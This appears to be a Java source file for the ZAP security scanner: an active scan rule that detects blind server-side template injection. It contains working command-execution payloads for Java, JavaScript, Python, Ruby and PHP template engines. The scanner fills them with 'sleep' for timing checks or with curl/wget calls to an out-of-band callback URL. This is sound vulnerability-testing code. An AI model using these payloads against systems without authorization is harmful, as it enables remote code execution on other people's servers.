/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2022 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.io.IOException;
import java.net.SocketException;
import java.util.concurrent.TimeUnit;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.control.Control;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.core.scanner.Plugin;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.addon.oast.ExtensionOast;
import org.zaproxy.zap.model.Tech;

/**
 * Active Plugin for Server Side Template Injection testing and verification.
 *
 * @author DiogoMRSilva (2019)
 */
public class SstiBlindScanRule extends AbstractAppParamPlugin {

    /** Prefix for internationalised messages used by this rule */
    private static final String MESSAGE_PREFIX = "ascanalpha.sstiblind.";

    private static final String SECONDS_PLACEHOLDER = "X_SECONDS_X";

    private static final float ERROR_MARGIN = 0.9f;

    // Most of the exploits have been created by James Kettle @albinowax and the Tplmap creator

    private static final String[] JAVA_COMMAND_EXEC_PAYLOADS = {
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"X_COMMAND_X\") }", // javaFreemarker https://portswigger.net/blog/server-side-template-injection
        "#set($engine=\"\")\n"
                + "#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"X_COMMAND_X\"))\n"
                + "#set($null=$proc.waitFor())\n"
                + "${null}" // javaVelocity
        // https://portswigger.net/blog/server-side-template-injection
    };

    private static final String[] JAVASCRIPT_COMMAND_EXEC_PAYLOADS = {
        "{{= global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString() }}", // Javascript dot
        "<%= global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()%>", // Javascript EJS
        "#{global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()}", // Javascript jade
        "{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()\\\")\")()}}" // Javascript Nunjucks
    };

    private static final String[] PHP_COMMAND_EXEC_PAYLOADS = {
        "{system(\"X_COMMAND_X\")}", // PHP smarty
    };

    private static final String[] PYTHON_COMMAND_EXEC_PAYLOADS = {
        "{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"X_COMMAND_X\")}}", // python3 jinja2 possibly doesn't work
        "${__import__(\"subprocess\").check_output(\"X_COMMAND_X\", shell=True)}", // python Mako
        "{{__import__(\"subprocess\").check_output(\"X_COMMAND_X\", shell=True)}}", // Python
        // Tornado
    };

    private static final String[] RUBY_COMMAND_EXEC_PAYLOADS = {
        "<%=%x(X_COMMAND_X)%>", // Ruby ERB
        "#{%x(X_COMMAND_X)}" // Ruby Slims
    };

    private static final String[] WAYS_TO_MAKE_HTTP_REQUESTS_CMD_LINE = {
        "curl X_URL_X", "wget X_URL_X"
    };

    private static final Logger LOG = LogManager.getLogger(SstiBlindScanRule.class);

    @Override
    public int getId() {
        return 90036;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(MESSAGE_PREFIX + "desc");
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        return Constant.messages.getString(MESSAGE_PREFIX + "soln");
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(MESSAGE_PREFIX + "refs");
    }

    @Override
    public int getCweId() {
        return 74; // CWE - 74 : Failure to Sanitize Data into a Different Plane ('Injection')
    }

    @Override
    public int getWascId() {
        return 20; // WASC-20: Improper Input Handling
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    @Override
    public void scan(HttpMessage msg, String paramName, String value) {
        if (inScope(Tech.JAVA)) {
            sendPayloadsToMakeCallBack(paramName, JAVA_COMMAND_EXEC_PAYLOADS);
            timeBasedTests(paramName, JAVA_COMMAND_EXEC_PAYLOADS);
        }
        if (inScope(Tech.JAVASCRIPT)) {
            sendPayloadsToMakeCallBack(paramName, JAVASCRIPT_COMMAND_EXEC_PAYLOADS);
            timeBasedTests(paramName, JAVASCRIPT_COMMAND_EXEC_PAYLOADS);
        }
        if (inScope(Tech.PYTHON)) {
            sendPayloadsToMakeCallBack(paramName, PYTHON_COMMAND_EXEC_PAYLOADS);
            timeBasedTests(paramName, PYTHON_COMMAND_EXEC_PAYLOADS);
        }
        if (inScope(Tech.RUBY)) {
            sendPayloadsToMakeCallBack(paramName, RUBY_COMMAND_EXEC_PAYLOADS);
            timeBasedTests(paramName, RUBY_COMMAND_EXEC_PAYLOADS);
        }
        if (inScope(Tech.PHP)) {
            sendPayloadsToMakeCallBack(paramName, PHP_COMMAND_EXEC_PAYLOADS);
            timeBasedTests(paramName, PHP_COMMAND_EXEC_PAYLOADS);
        }
    }

    /**
     * Tries to inject template code that will cause a time delay in the case of being rendered
     *
     * @param paramName the name of the parameter where to search for our injection
     * @param commandExecPayloads the payloads that can possibly execute commands, they need to have
     *     the word X_COMMAND_X in the place where the command should be inserted
     */
    private void timeBasedTests(String paramName, String[] commandExecPayloads) {

        String payloadFormat;
        for (String sstiFormatPayload : commandExecPayloads) {
            payloadFormat = sstiFormatPayload.replace("X_COMMAND_X", "sleep X_SECONDS_X");
            checkIfCausesTimeDelay(paramName, payloadFormat);
        }
        // TODO make more requests using other ways of delaying a response
    }

    /**
     * Check if the given payloadFormat causes an time delay in the server
     *
     * @param paramName the name of the parameter where to search for or injection
     * @param payloadFormat format string that when formated with 1 argument makes a string that may
     *     cause a delay equal to the number of second inserted by the format
     */
    private void checkIfCausesTimeDelay(String paramName, String payloadFormat) {

        String test2seconds = payloadFormat.replace(SECONDS_PLACEHOLDER, "2");
        HttpMessage msg = getNewMsg();
        setParameter(msg, paramName, test2seconds);
        try {
            sendAndReceive(msg, false);
            int time2secondsTest = msg.getTimeElapsedMillis();

            if (time2secondsTest >= TimeUnit.SECONDS.toMillis(2) * ERROR_MARGIN) {
                // If we detect a response that takes more time that the delay we tried to
                // cause it is possible that our injection was successful but it also may
                // have been caused by the network or other variable. So further testing is needed.

                String sanityTest = payloadFormat.replace(SECONDS_PLACEHOLDER, "0");
                msg = getNewMsg();
                setParameter(msg, paramName, sanityTest);
                sendAndReceive(msg, false);
                int timeWithSanityTest = msg.getTimeElapsedMillis();

                int sumTime =
                        (int)
                                (1
                                        + TimeUnit.MILLISECONDS.toSeconds(
                                                (long) time2secondsTest + timeWithSanityTest));
                String testOfSumSeconds =
                        payloadFormat.replace(SECONDS_PLACEHOLDER, Integer.toString(sumTime));
                msg = getNewMsg();
                setParameter(msg, paramName, testOfSumSeconds);
                sendAndReceive(msg, false);
                int timeSumSecondsTest = msg.getTimeElapsedMillis();

                if (timeSumSecondsTest >= TimeUnit.SECONDS.toMillis(sumTime) * ERROR_MARGIN) {
                    this.newAlert()
                            .setConfidence(Alert.CONFIDENCE_HIGH)
                            .setUri(msg.getRequestHeader().getURI().toString())
                            .setParam(paramName)
                            .setAttack(testOfSumSeconds)
                            .setMessage(msg)
                            .raise();
                }
            }
        } catch (SocketException ex) {
            LOG.debug(
                    "Caught {} {} when accessing: {}",
                    ex.getClass().getName(),
                    ex.getMessage(),
                    msg.getRequestHeader().getURI());
        } catch (IOException ex) {
            LOG.warn(
                    "SSTI vulnerability check failed for parameter [{}] and payload [{}] due to an I/O error",
                    paramName,
                    payloadFormat,
                    ex);
        }
    }

    /**
     * Function tries to make system commands that call back to ZAP.
     *
     * @param paramName the name of the parameter will be used for testing for injection
     * @param commandExecPayloads the payloads that can possibly execute commands, they need to be
     *     format strings
     */
    private void sendPayloadsToMakeCallBack(String paramName, String[] commandExecPayloads) {

        int allowedNumberCommands = 0;
        // whe should only run this scanner when the level is High, util then
        // just time based attacks should be used because of the limitations
        // in requests numbers
        if (this.getAttackStrength() == Plugin.AttackStrength.HIGH) {
            allowedNumberCommands = 1;
        } else if (this.getAttackStrength() == Plugin.AttackStrength.INSANE) {
            allowedNumberCommands = 999;
        }

        int numberCommandsSent = 0;

        ExtensionOast extOast =
                Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);

        if (extOast == null) {
            LOG.info("Could not use extension OAST in blind SSTI scan rule");
            return;
        }

        for (String requestCmd : WAYS_TO_MAKE_HTTP_REQUESTS_CMD_LINE) {
            if (numberCommandsSent >= allowedNumberCommands) {
                break;
            }
            numberCommandsSent += 1;
            for (String sstiFormatPayload : commandExecPayloads) {
                Alert alert =
                        newAlert()
                                .setUri(getBaseMsg().getRequestHeader().getURI().toString())
                                .setConfidence(Alert.CONFIDENCE_HIGH)
                                .setSource(Alert.Source.ACTIVE)
                                .setParam(paramName)
                                .setOtherInfo(
                                        Constant.messages.getString(
                                                MESSAGE_PREFIX + "alert.recvdcallback.otherinfo"))
                                .build();

                String url;
                if (extOast.getActiveScanOastService() != null) {
                    try {
                        url = "http://" + extOast.registerAlertAndGetPayload(alert);
                    } catch (Exception e) {
                        LOG.warn("Failed to register callback on oast", e);
                        return;
                    }
                } else if (extOast.getCallbackService() != null) {
                    url =
                            extOast.registerAlertAndGetPayloadForCallbackService(
                                    alert, SstiBlindScanRule.class.getSimpleName());
                } else {
                    LOG.info("Could not use extension OAST on blind SSTI scan rule");
                    return;
                }

                String payload =
                        sstiFormatPayload
                                .replace("X_COMMAND_X", requestCmd)
                                .replace("X_URL_X", url);
                // TODO split the url to avoid FPs
                HttpMessage msg = getNewMsg();
                setParameter(msg, paramName, payload);
                alert.setMessage(msg);
                alert.setAttack(payload);

                try {
                    sendAndReceive(msg, false);
                } catch (SocketException ex) {
                    LOG.debug(
                            "Caught {} {} when accessing: {}",
                            ex.getClass().getName(),
                            ex.getMessage(),
                            msg.getRequestHeader().getURI());
                } catch (IOException ex) {
                    LOG.warn(
                            "SSTI vulnerability check failed for parameter [{}] and payload [{}] due to an I/O error",
                            paramName,
                            payload,
                            ex);
                } catch (Exception ex) {
                    LOG.error("Failed SSTI rule with payload [{}]", payload, ex);
                }
            }
        }
    }
}
